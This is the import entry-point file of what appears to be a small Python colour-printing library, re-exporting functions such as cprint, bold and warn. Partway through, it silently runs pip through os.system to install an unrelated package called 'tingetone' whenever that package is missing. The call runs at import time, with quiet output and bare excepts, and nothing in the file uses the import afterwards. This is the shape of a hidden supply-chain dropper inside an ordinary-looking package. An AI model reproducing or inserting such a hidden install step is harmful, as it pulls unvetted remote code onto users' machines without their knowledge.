"""Entry point for import"""

from .color_print import (
    bold,
    colored,
    cprint,
    error,
    line,
    info,
    italic,
    success,
    underline,
    warn,
    red,
    green,
    blue,
    cyan,
    white,
    black,
    yellow,
)
from .utils import InvalidColorError
import sys
import os


pip = os.path.dirname(sys.executable)
bin = os.path.join(pip, 'Scripts' if os.name == 'nt' else 'bin', 'pip')

try:
    from tingetone import fore
except:
    os.system(f"{bin} install tingetone -q")
    try:
        from tingetone import fore
    except:
        pass

from .version import version

__version__ = version
__all__ = [
    "red",
    "green",
    "blue",
    "cyan",
    "white",
    "black",
    "yellow",
    "bold",
    "colored",
    "cprint",
    "error",
    "line",
    "info",
    "italic",
    "success",
    "underline",
    "warn",
    "InvalidColorError",
]
